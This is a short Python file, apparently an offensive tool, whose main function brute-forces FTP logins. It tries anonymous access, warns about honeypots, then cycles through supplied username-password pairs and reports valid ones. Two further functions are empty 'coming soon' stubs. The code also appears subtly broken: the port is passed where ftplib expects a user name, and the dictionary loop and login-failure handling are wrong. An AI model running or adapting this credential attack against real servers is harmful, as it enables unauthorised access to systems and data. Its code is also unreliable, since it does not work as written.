from ftplib import FTP, FTP_TLS


def brute(host, port, uplist):
    if host is not None and port is not None and uplist is not None:
        with FTP(str(host), port) as ftpBrute:
            if isinstance(uplist, dict):
                print("Attempting anonymous login first....")
                if "230" in ftpBrute.login():
                    print("Wow, so anonymous login is allowed, double check to make sure this IS NOT a honeypot.")
                for index in uplist:
                    if "230" in ftpBrute.login(user=index[0], passwd=index[1]):
                        print(f"Identified: {index} as a valid login.")
                    else:
                        continue


def uploader(host, port, username, password):
    print("Coming soon...")


def ftp_proxy(host, port, username, password):
    print("Coming soon.....")


